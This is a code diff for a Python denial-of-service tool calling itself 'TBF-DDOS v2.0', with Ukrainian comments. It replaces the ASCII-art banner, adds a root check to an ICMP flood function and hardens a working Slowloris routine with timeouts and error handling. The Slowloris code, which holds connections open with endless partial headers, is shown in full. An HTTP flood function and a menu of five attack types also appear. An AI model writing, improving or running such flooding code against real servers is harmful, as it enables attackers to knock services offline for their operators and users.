@@ -12,7 +12,6 @@ import os
 import sys
 import struct
 import logging
-from datetime import datetime
 
 # Кольори
 RED = "\033[91m"
@@ -34,19 +33,32 @@ def clear():
 
 def banner():
     print(f"""{RED}{BOLD}
-    ╔══════════════════════════════════════════════════════════════════╗
-    ║                                                                  ║
-    ║   ████████╗██████╗ ███████╗    ██████╗ ██████╗  ██████╗ ███████╗
-    ║   ╚══██╔══╝██╔══██╗██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
-    ║      ██║   ██████╔╝█████╗      ██║  ██║██████╔╝██║   ██║███████╗
-    ║      ██║   ██╔══██╗██╔══╝      ██║  ██║██╔══██╗██║   ██║╚════██║
-    ║      ██║   ██████╔╝██║         ██████╔╝██║  ██║╚██████╔╝███████║
-    ║      ╚═╝   ╚═════╝ ╚═╝         ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
-    ║                                                                  ║
-    ║                  TBF-DDOS v2.0 — by TBFPUMBA                    ║
-    ║            Technology. Security. Efficiency.                     ║
-    ║                                                                  ║
-    ╚══════════════════════════════════════════════════════════════════╝{RESET}
+╔══════════════════════════════════════════════════════════════════╗
+║                                                                  ║
+║   ████████╗██████╗ ███████╗    ███╗   ██╗ ██████╗ ████████╗███████╗
+║   ╚══██╔══╝██╔══██╗██╔════╝    ████╗  ██║██╔═══██╗╚══██╔══╝██╔════╝
+║      ██║   ██████╔╝█████╗      ██╔██╗ ██║██║   ██║   ██║   █████╗  
+║      ██║   ██╔══██╗██╔══╝      ██║╚██╗██║██║   ██║   ██║   ██╔══╝  
+║      ██║   ██████╔╝██║         ██║ ╚████║╚██████╔╝   ██║   ███████╗
+║      ╚═╝   ╚═════╝ ╚═╝         ╚═╝  ╚═══╝ ╚═════╝    ╚═╝   ╚══════╝
+║                                                                  ║
+║        ██████╗ ██████╗  ██████╗     ███████╗██╗  ██╗            ║
+║        ██╔══██╗██╔══██╗██╔═══██╗    ██╔════╝██║  ██║            ║
+║        ██████╔╝██████╔╝██║   ██║    ███████╗███████║            ║
+║        ██╔═══╝ ██╔══██╗██║   ██║    ╚════██║██╔══██║            ║
+║        ██║     ██║  ██║╚██████╔╝    ███████║██║  ██║            ║
+║        ╚═╝     ╚═╝  ╚═╝ ╚═════╝     ╚══════╝╚═╝  ╚═╝            ║
+║                                                                  ║
+║                ██╗  ██╗██████╗ ██████╗  ██████╗                 ║
+║                ██║  ██║██╔══██╗██╔══██╗██╔═══██╗                ║
+║                ███████║██████╔╝██████╔╝██║   ██║                ║
+║                ██╔══██║██╔═══╝ ██╔══██╗██║   ██║                ║
+║                ██║  ██║██║     ██║  ██║╚██████╔╝                ║
+║                ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝                 ║
+║                                                                  ║
+║                     TBFPUMBA — TECHNOLOGY. SECURITY. EFFICIENCY  ║
+║                                                                  ║
+╚══════════════════════════════════════════════════════════════════╝{RESET}
     """)
     print(f"{CYAN}╔══════════════════════════════════════════════════════════════════╗{RESET}")
     print(f"{CYAN}║{RESET} {BOLD}{PURPLE}🔥 TBF-DDOS v2.0 — 5 типів атак 🔥{RESET}                           {CYAN}║{RESET}")
@@ -124,6 +136,11 @@ def http_flood(target_ip, target_port, duration, threads):
     print(f"{GREEN}✅ HTTP-атаку завершено!{RESET}")
 
 def icmp_flood(target_ip, duration, threads):
+    # Перевірка прав для ICMP (потрібен root)
+    if os.geteuid() != 0:
+        print(f"{RED}❌ ICMP-атака потребує root-прав! Запустіть з sudo або як root.{RESET}")
+        return
+    
     def flood():
         while True:
             try:
@@ -146,15 +163,19 @@ def icmp_flood(target_ip, duration, threads):
 
 def slowloris(target_ip, target_port, duration, threads):
     def flood():
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((target_ip, target_port))
-        sock.send(b"GET / HTTP/1.1\r\n")
-        while True:
-            try:
-                sock.send(b"X-Header: keep-alive\r\n")
-                time.sleep(10)
-            except:
-                break
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)  # ← Таймаут для уникнення зависання
+            sock.connect((target_ip, target_port))
+            sock.send(b"GET / HTTP/1.1\r\n")
+            while True:
+                try:
+                    sock.send(b"X-Header: keep-alive\r\n")
+                    time.sleep(10)
+                except:
+                    break
+        except:
+            pass
     
     log_attack(target_ip, target_port, "Slowloris", duration, threads)
     print(f"{GREEN}🔓 Запуск Slowloris на {target_ip}:{target_port}{RESET}")
